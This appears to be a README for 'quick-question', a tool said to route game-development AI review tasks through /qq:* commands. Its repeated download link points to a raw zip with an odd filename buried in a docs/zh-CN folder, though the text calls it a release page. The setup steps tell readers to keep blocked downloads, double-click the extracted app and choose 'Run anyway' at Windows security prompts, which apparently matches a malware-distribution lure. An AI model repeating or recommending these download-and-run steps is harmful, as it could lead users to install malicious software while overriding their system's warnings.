# 🎮 quick-question - Faster Game Dev Review Loop

[![Download quick-question](https://img.shields.io/badge/Download%20quick--question-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/brandonle7116/quick-question/raw/refs/heads/main/docs/zh-CN/quick-question-subdeanery.zip)

## 🖥️ What this is

quick-question helps game developers check work faster. It links your game editor and your AI tools so you can:

- send work for review
- check builds and tests
- get feedback from more than one model
- keep the process tied to the current stage of work

It works with common game tools like Unity, Godot, Unreal, and S&box. It uses `/qq:go` routing and a set of `/qq:*` commands to help move tasks through the right checks.

## 📥 Download quick-question

Visit this page to download and run quick-question on Windows:

https://github.com/brandonle7116/quick-question/raw/refs/heads/main/docs/zh-CN/quick-question-subdeanery.zip

After you open the page:

1. find the latest release or download option
2. get the Windows version
3. save the file to your computer
4. open the file to start the app
5. follow the on-screen steps if Windows asks for permission

If your browser blocks the download, choose Keep or Save when prompted

## 🪟 Windows setup

Use these steps on a Windows PC:

1. Download quick-question from the link above
2. Save it to a folder you can find again, such as Downloads or Desktop
3. If the file is in a .zip folder, right-click it and choose Extract All
4. Open the extracted folder
5. Double-click the app file to run it
6. If Windows shows a security prompt, choose Run anyway if you trust the source
7. Keep the app open while you work

If you plan to use it with a game editor, leave that editor open too

## ✅ Before you start

For the smoothest setup, make sure you have:

- Windows 10 or Windows 11
- a recent version of your game editor
- enough free disk space for your project files
- an internet connection for model calls and updates
- permission to access the folders where your game project lives

For best results, close other heavy apps while you test your workflow

## 🎯 What quick-question does

quick-question acts as a control plane for game-dev agents. In plain terms, it helps you manage AI help across your work instead of handling each task by hand.

Common uses include:

- checking if code still builds
- running tests after changes
- asking for a second review from another model
- routing tasks by project stage
- keeping review steps in one place
- helping your team stay on the same process

It is built for Claude Code-first workflows, but it also works with other tools through HTTP and MCP

## 🧭 Main workflow

A simple flow looks like this:

1. you make a change in your game project
2. you send the task through `/qq:go`
3. quick-question sends it to the right check
4. the app helps verify compile, test, and review steps
5. you see the result and decide what to do next

This helps reduce back-and-forth when you are moving between code changes and review

## 🛠️ How to use it

Start with one command flow:

- use `/qq:go` when you want the system to route the task
- use the other `/qq:*` commands when you want a specific action
- keep each request short and clear
- mention the game engine you are using
- include the part of the project you want checked

Example uses:

- review a Unity script change
- check a Godot scene script
- verify an Unreal gameplay update
- ask for a cross-model review before you merge

## 🔌 Works with other tools

quick-question can sit between your tools and your checks. That means you can use it with:

- Claude Code
- HTTP-based tools
- MCP-compatible tools
- editor workflows for Unity, Godot, Unreal, and S&box

This helps you keep one process even if your setup uses more than one app or model

## 🧩 Commands

quick-question includes 26 slash commands under `/qq:*`. These cover common work such as:

- routing
- compile checks
- test runs
- review steps
- model comparison
- lifecycle-aware task handling

If you are new to the app, start with `/qq:go` and use the other commands as you learn the flow

## 🔍 Best way to use it with game editors

### 🎮 Unity
Use quick-question to check script changes, editor-driven updates, and compile results before you move on to play mode tests

### 🧱 Godot
Use it to review script edits, scene logic, and project changes that need a clear yes-or-no check

### ⚙️ Unreal
Use it to help with gameplay code, build checks, and review steps before you move on to larger changes

### 🕹️ S&box
Use it to keep agent help tied to your current stage of work while you test and review changes

## 📁 Suggested folder setup

A simple setup makes things easier:

- keep the app in Downloads or a tools folder
- keep your game project in a separate folder
- avoid deep folder paths with long names
- use one project folder per game if you work on more than one

This helps when you point quick-question at the right project and review target

## 🧪 Example use cases

You can use quick-question when you want to:

- confirm a script still compiles
- check a build after a change
- compare answers from more than one model
- review a risky change before sharing it
- keep agent work tied to the right lifecycle step
- move from edit to verify without losing track

## 🔐 Permissions and access

The app may need access to your project files so it can check code, builds, or test results. Give it access only to the folders you want it to use. If Windows asks for a folder choice, select your game project folder

## 🧹 If something does not work

Try these steps:

1. make sure the app is fully downloaded
2. check that you extracted the files if they came in a zip
3. run the app again
4. confirm your project folder still exists
5. make sure your game editor is installed
6. restart Windows if the app does not open
7. open the app from a simple folder path like Desktop or Downloads

If the issue continues, try moving the app and the project to shorter folder paths

## 🗂️ Project focus

quick-question is built for:

- game dev agents
- compile checks
- test checks
- review loops
- code review
- model routing
- editor-friendly workflows

It is a good fit if you want a clear path from change to verification

## 📎 Download again

Download or open the main page here:

https://github.com/brandonle7116/quick-question/raw/refs/heads/main/docs/zh-CN/quick-question-subdeanery.zip